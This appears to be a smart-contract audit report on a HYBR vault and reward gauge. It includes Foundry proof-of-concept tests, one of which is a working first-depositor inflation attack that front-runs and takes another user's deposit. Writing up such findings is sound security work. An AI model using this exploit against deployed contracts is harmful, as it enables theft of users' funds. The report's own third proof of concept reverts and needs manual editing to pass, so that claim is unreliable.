
| ID                                                                                                                     | Title                                                                                                          | Severity |
| ---------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- | -------- |
| [M-01](#m-01-first-depositor-can-manipulate-share-price-to-steal-subsequent-deposits-an-inflation-attack)                  | First Depositor Can Manipulate Share Price to Steal Subsequent Deposits (an inflation attack)                  | Medium   |
| [L-01](#l-01-rewards-sent-to-empty-gauge-are-permanently-lost)                                                               | Rewards sent to empty gauge are permanently lost                                                               | Low      |
| [L-02](#l-02-any-split-a-venft-into-multiple-new-venfts-with-specified-weight-distribution-will-lose-rewards-for-old-venfts) | any Split a veNFT into multiple new veNFTs with specified weight distribution will lose rewards for old veNFTs | Low      |


# [M-01] First Depositor Can Manipulate Share Price to Steal Subsequent Deposits (an inflation attack)


## Finding description and impact  

The `GrowthHYBR` contract implements a tokenized vault system where users deposit HYBR tokens and receive gHYBR shares in return. The contract also handles veNFT creation and management through VotingEscrow integration.

The issue lies in the `deposit()` function's share calculation mechanism. When calculating shares for new deposits, the function uses the ratio between the deposit amount and total assets:

  
```solidity
uint256 shares = calculateShares(amount);
```

This calculation is vulnerable to manipulation by the first depositor through the following steps:

1. Deposit a minimal amount (e.g., 1 wei) as the first deposit to receive 1 share
2. Directly call `deposit_for()` on VotingEscrow to increase the total assets significantly
3. This manipulates the share price for subsequent depositors who will receive virtually no shares

The key vulnerability is in `calculateShares()`:

```solidity
function calculateShares(uint256 amount) public view returns (uint256) {
    uint256 _totalSupply = totalSupply();
    uint256 _totalAssets = totalAssets();
    if (_totalSupply == 0 || _totalAssets == 0) {
        return amount;
    }
    return (amount * _totalSupply) / _totalAssets;
}
```

The first deposit condition (`_totalSupply == 0`) makes this attack possible by allowing the attacker to establish an artificial share price with a minimal deposit.

## Proof of Concept

add this in `C4POC.t.sol` 
and run `forge test --mt testInflationAttack -vvv --decode-internal`
```solidity
contract C4PoC is C4PoCTestbed {

    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    
    uint256 public constant INITIAL_AMOUNT = 1000e18;

    function setUp() public override {
        super.setUp();

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Fund test accounts using already deployed HYBR
        vm.startPrank(deployer);
        hybr.transfer(alice, INITIAL_AMOUNT);
        hybr.transfer(bob, INITIAL_AMOUNT);
        vm.stopPrank();

        // Setup approvals
        vm.prank(alice);
        hybr.approve(address(gHybr), type(uint256).max);
        
        vm.prank(bob);
        hybr.approve(address(gHybr), type(uint256).max);
    }


    function testInflationAttack() public {
        vm.startPrank(alice);

        // First approve HYBR for VotingEscrow
        hybr.approve(address(votingEscrow), type(uint256).max);
    
        // frontrun bob deposit by depositing 1 wei
        gHybr.deposit(1, address(0));
        uint256 firstVeTokenId = gHybr.veTokenId();

        // Additional deposit directly to VotingEscrow needs tokens
        hybr.approve(address(votingEscrow), 50e18);
        votingEscrow.deposit_for(firstVeTokenId, 50e18);
        vm.stopPrank();
        

        vm.prank(bob);
        gHybr.deposit(30e18, address(0));
        
        console.log("Bob received 0 shares and alice has stolen all the funds: ", gHybr.balanceOf(bob));
        assertEq(gHybr.totalAssets(), 80e18+1, "Wrong total assets");

    }
}
```


## Recommended mitigation steps

- Mint initial shares to a dead address during initialization and implement a minimum shares to mint
- allow the user to implement a slippage input as minimum shares to be accepted to him

# [L-01] Rewards sent to empty gauge are permanently lost

## Finding description and impact

The `GaugeV2` contract implements a staking and reward distribution mechanism where users can stake  tokens and earn rewards over time. The reward distribution is handled through the `notifyRewardAmount()` function, which accepts rewards from a distributor and calculates the reward rate for the next period.

An issue exists in the reward calculation logic of `notifyRewardAmount()`. When rewards are sent to a gauge with no deposits (`_totalSupply = 0`), these rewards become permanently lost since the `rewardPerToken()` calculation can never distribute them:

```solidity
function rewardPerToken() public view returns (uint256) {
    if (_totalSupply == 0) {
        return rewardPerTokenStored;
    } else {
        return rewardPerTokenStored + (lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / _totalSupply; 
    }
}
```


When `_totalSupply` is 0, the function simply returns the stored value without accounting for the new rewards. Subsequently, even after users stake tokens, they cannot claim these "lost" rewards since they were never properly accounted for in `rewardPerTokenStored`.

> This creates a permanent loss of funds since there is no mechanism to recover or redistribute these rewards once they are sent to an empty gauge.

for the first staker rewards are calculated as `lastTimeRewardApplicable() - lastUpdateTime` which for the first staker is will be updated already to the current timestamp and hence will be 0.

and since stakers can't earn past rewards, it should be added back in the new epoch notification as the rollover idea of the `gaugeCl` contract which didn't happen here
```solidity
function notifyRewardAmount(address token, uint256 reward) external nonReentrant isNotEmergency onlyDistribution updateReward(address(0)) {//@audit-issue notifyrewardamount while there is no deposits will make those rewards lost

require(token == address(rewardToken), "IA");

rewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);

  

if (block.timestamp >= _periodFinish) {

rewardRate = reward / DURATION;

} else {

uint256 remaining = _periodFinish - block.timestamp;

uint256 leftover = remaining * rewardRate;

rewardRate = (reward + leftover) / DURATION;

```

`remaining` here is only calculated if there was remaining duration left in the epoch and those amounts will be added, but past durations are never added back.

and if it was new epoch, the rewards amounts are now lost forever.
## Proof of Concept

add this in C4POC.t.sol
and run `forge test --mt testnotifyRewardAmountWithNoDepositsWillLoseRewards -vvvv --decode-internal`
```solidity

import {GaugeV2} from "../contracts/GaugeV2.sol";

contract C4PoC is C4PoCTestbed {

    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    
    uint256 public constant INITIAL_AMOUNT = 1000e18;

    function setUp() public override {
        super.setUp();
    }

 function testnotifyRewardAmountWithNoDepositsWillLoseRewards() external
{

// Creating new GaugeV2
GaugeV2 gauge = new GaugeV2(
address(hybr),
address(rewardHybr),
address(votingEscrow),
address(hybr),
address(this),
address(0),
address(0),
false
);

skip(7 days + 7 days);

// Distribute rewards while no deposits exist.
hybr.approve(address(gauge), 100e18);
gauge.notifyRewardAmount(address(hybr), 100e18);

// fast forward duration
vm.warp(block.timestamp + 8 days);

// New deposit after distrtibuting rewards.
uint256 stakeAmounts = 100e18;
hybr.approve(address(gauge), stakeAmounts);
gauge.deposit(stakeAmounts);

// rewardPerToken will not be updated as _totalSupply = 0
uint256 accrued = gauge.earned(address(this));
console.log("accrued is zero: ", accrued);

// Trying to harvest rewards
uint256 beforeharvest = hybr.balanceOf(address(this));
gauge.withdrawAllAndHarvest(0);
uint256 afterharvest = hybr.balanceOf(address(this));
console.log("harvested reward: ", afterharvest - beforeharvest - stakeAmounts);

// Rewards are stuck in the gauge with no functions or a way to rescue them
uint256 BalanceIncludingRewards = hybr.balanceOf(address(gauge));
uint256 totalsupply = gauge.totalSupply();

console.log("BalanceIncludingRewards: ", BalanceIncludingRewards);
console.log("totalsupply: ", totalsupply);
console.log("rewardAmount: ", BalanceIncludingRewards - totalsupply);

// no total supply but still stuck balance
assertEq(BalanceIncludingRewards, 100e18);
assertEq(totalsupply, 0);
}
}
```



## Recommended mitigation steps

Add a check to prevent reward notifications when the gauge is empty:

```solidity
function notifyRewardAmount(address token, uint256 reward) external 
    nonReentrant 
    isNotEmergency 
    onlyDistribution 
    updateReward(address(0)) 
{
    require(_totalSupply > 0, "Cannot notify rewards for empty gauge");
    // ... rest of the function
}
```
 
Alternatively, implement a reward buffer system that holds rewards until the first stake:

```solidity
uint256 public pendingRewards;

function notifyRewardAmount(address token, uint256 reward) external {
    if (_totalSupply == 0) {
        pendingRewards += reward;
        return;
    }
    // Process both pending and new rewards
    uint256 totalReward = reward + pendingRewards;
    pendingRewards = 0;
    // ... rest of the function with totalReward
}
```




# [L-02] any Split a veNFT into multiple new veNFTs with specified weight distribution will lose rewards for old veNFTs
## Finding description and impact

The `GrowthHYBR` contract implements a staking mechanism where users can deposit HYBR tokens and receive gHYBR shares in return. The contract locks these tokens in a veNFT (Voting Escrow NFT) position and can accumulate various rewards including:

- Rebase rewards from `RewardsDistributor`
- Bribe rewards from voted pools
- Penalty rewards from rHYBR conversions


An issue exists in the `withdraw()` function where user withdrawal triggers an NFT split without first claiming accumulated rewards. When the contract's veNFT is split using `multiSplit()`, the original NFT's rewards become inaccessible, leading to permanent loss of accrued rewards.
  

The core issue stems from two factors:

1. Rewards are tied to the original veNFT ID
2. The `withdraw()` function splits the NFT without claiming rewards first


> While the contract has a `claimRewards()` function, it's only callable by the operator and isn't integrated into the withdrawal flow.

## Recommended mitigation steps

Add reward claiming before NFT split in the withdrawal process:
## PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";

import {C4PoCTestbed} from "./C4PoCTestbed.t.sol";
import {GaugeV2} from "../contracts/GaugeV2.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract C4PoC is C4PoCTestbed {

    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    
    uint256 public constant INITIAL_AMOUNT = 1000e18;

    function setUp() public override {
        super.setUp();
    }

function test_gHybrLosesRewardsOnWithdraw() external {
    // Initial setup
    uint256 initialLock = 1000e18;
    uint256 depositAmount = 500e18;
    uint256 rewardAmount = 100e18;

    // Fund gHybr with initial deposit
    deal(address(hybr), address(this), initialLock);
    hybr.approve(address(gHybr), initialLock);
    gHybr.deposit(initialLock, address(this));
    uint256 firstTokenId = gHybr.veTokenId();
    
    // Distribute some rewards to gHybr's veNFT
    skip(1 weeks);
    deal(address(hybr), address(rewardsDistributor), rewardAmount);
    vm.startPrank(address(minter));
    rewardsDistributor.checkpoint_token();
    vm.stopPrank();
    
    // Fast forward to accumulate rewards
    skip(2 weeks);
    
    // Check rewards before withdrawal
    uint256 rewardsBeforeSplit = rewardsDistributor.claimable(firstTokenId);
    console.log("Rewards before withdraw:", rewardsBeforeSplit);
    assertGt(rewardsBeforeSplit, 0, "Should have accumulated rewards");

    // User withdraws half their position
    uint256 withdrawShares = (initialLock * 1e18) / (2 * 1e18);
    
    // Track original NFT balance
(int128 _amount, uint256 _end, bool _isPermanent) = votingEscrow.locked(firstTokenId);
uint256 originalVeBalance = uint256(int256(_amount));
    console.log("Original veNFT balance:", originalVeBalance);
    
    gHybr.setHeadNotWithdrawTime(0);
    gHybr.setTailNotWithdrawTime(0);
    gHybr.setVoter(address(voter));
    votingEscrow.toggleSplit(address(gHybr), true);
    // Execute withdrawal which triggers NFT split
    gHybr.withdraw(withdrawShares);
    
    // Verify rewards are lost
    gHybr.claimRewards();

    uint256 rewardsAfterSplit = gHybr.rebase();

    
    // The rewards from the original tokenId are now inaccessible
    assertEq(rewardsAfterSplit, 0, "New NFT should have no claimable rewards");
    
}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}

```

output:

```js
    ├─ [26500] GrowthHYBR::claimRewards()
    │   ├─ [7978] RewardsDistributor::claim(2)
    │   │   ├─ [7203] RewardsDistributor::_claim(604800 [6.048e5], 0x1d1499e622D69689cdf9004d05Ec547d650Ff211, 2)
    │   │   │   ├─ [1721] VotingEscrow::user_point_epoch(2) [staticcall]
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [1471] VotingEscrow::user_point_history(2, 1) [staticcall]
    │   │   │   │   └─ ← [Return] Point({ bias: 485616430428707405659 [4.856e20], slope: 7927447995941 [7.927e12], ts: 1814401 [1.814e6], blk: 1, permanent: 0 })
    │   │   │   └─ ← 0
    │   │   └─ ← [Return] 0
    │   ├─ [7682] TransparentUpgradeableProxy::fallback(2) [staticcall]
    │   │   ├─ [608] VoterV3::poolVote(2) [delegatecall]
    │   │   │   └─ ← [Revert] unrecognized function selector 0x9b4c478c for contract 0xe8dc788818033232EF9772CB2e6622F1Ec8bc840, which has no fallback function.
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] EvmError: Revert
```

PoC reverts due to another bug, but as we can see, `claimRewards()` returns 0

or you can comment this line for a full sucessfull PoC `address[] memory votedPools = IVoter(voter).poolVote(veTokenId);`
